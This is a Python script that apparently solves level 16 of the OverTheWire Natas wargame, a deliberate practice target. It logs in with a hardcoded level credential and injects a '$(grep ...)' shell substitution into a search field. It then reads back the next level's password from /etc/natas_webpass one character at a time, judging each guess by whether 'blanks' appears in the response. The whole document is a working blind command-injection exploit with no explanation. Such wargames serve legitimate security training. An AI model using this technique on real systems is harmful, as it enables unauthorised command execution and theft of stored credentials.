import requests
from string import *

username = "natas16"
password = "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"

session = requests.Session()

characters = ascii_lowercase + ascii_uppercase + digits
# characters = abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789

url = "http://{}.natas.labs.overthewire.org/".format(username)

password_tried = ""  # empty string
# password_tried = list()


while len(password_tried) != 32:  # we know that every level's password is of length 32
    for ch in characters:
        print("trying this password now --> {}{}".format(password_tried, ch))
        # print("trying this password now --> {}{}".format("".join(password_tried), ch))
        response = session.post(
            url, data={"needle": "blanks$(grep ^{}{} /etc/natas_webpass/natas17)".format(password_tried, ch)}, auth=(username, password))  # ^ means begins with
        # response = session.post(
        #    url, data={"username": "blanks$(grep ^{}{} /etc/natas_webpass/natas17)".format("".join(password_tried), ch)}, auth=(username, password))
        content = response.text

        if "blanks" not in content:  # if the word is not in the output
            password_tried = password_tried + ch  # add character to the string
            # password_tried.append(ch)
            break  # break the current loop

print(password_tried)
